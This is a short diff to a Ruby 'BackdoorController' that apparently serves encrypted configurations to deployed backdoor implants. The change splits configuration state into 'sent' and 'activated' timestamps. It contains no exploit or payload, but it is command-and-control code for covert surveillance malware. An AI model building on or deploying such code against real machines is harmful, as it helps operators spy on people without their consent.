@@ -184,9 +184,13 @@ class BackdoorController < RESTController
 
     case @request[:method]
       when 'GET'
-        config = backdoor.configs.where(:sent.exists => false).last
+        config = backdoor.configs.where(:activated.exists => false).last
         return RESTController.reply.not_found if config.nil?
-        
+
+        # we have sent the configuration, wait for activation
+        config.sent = Time.now.getutc.to_i
+        config.save
+
         # encrypt the config for the backdoor using the confkey
         json_config = JSON.parse(config[:config])
         bson_config = BSON.serialize(json_config)
@@ -195,8 +199,8 @@ class BackdoorController < RESTController
         return RESTController.reply.ok(enc_config, {content_type: 'binary/octet-stream'})
         
       when 'DELETE'
-        config = backdoor.configs.where(:sent.exists => false).last
-        config.sent = Time.now.getutc.to_i
+        config = backdoor.configs.where(:activated.exists => false).last
+        config.activated = Time.now.getutc.to_i
         config.save
         trace :info, "[#{@request[:peer]}] Configuration sent [#{@params['_id']}]"
     end
